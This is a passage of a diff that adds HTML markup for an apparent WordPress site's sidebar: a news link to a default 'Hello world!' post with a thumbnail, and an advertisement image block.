+                        <a class="imgnews" href="http://anphanam.vn/data/?p=1&amp;lang=en">
+						<img src="http://anphanam.vn/data/wp-content/uploads/2013/08/004-ryto-dziaugsmai-dykai-lt-336x225.jpg" width="56px" height="40px"/>
+						</a>
+                        <a class="textnews" href="http://anphanam.vn/data/?p=1&amp;lang=en">Hello world!</a>
+                    </div>
+									
+              
+                </div>
+            </div><!--End news-support--><br><br>
+                    <div class="adv">
+                        <img src="http://anphanam.vn/data/wp-content/uploads/2013/08/adv1.jpg" width="206" height="166"/>
+                    </div>  
+                </div>        </div><!--End main-->
+       
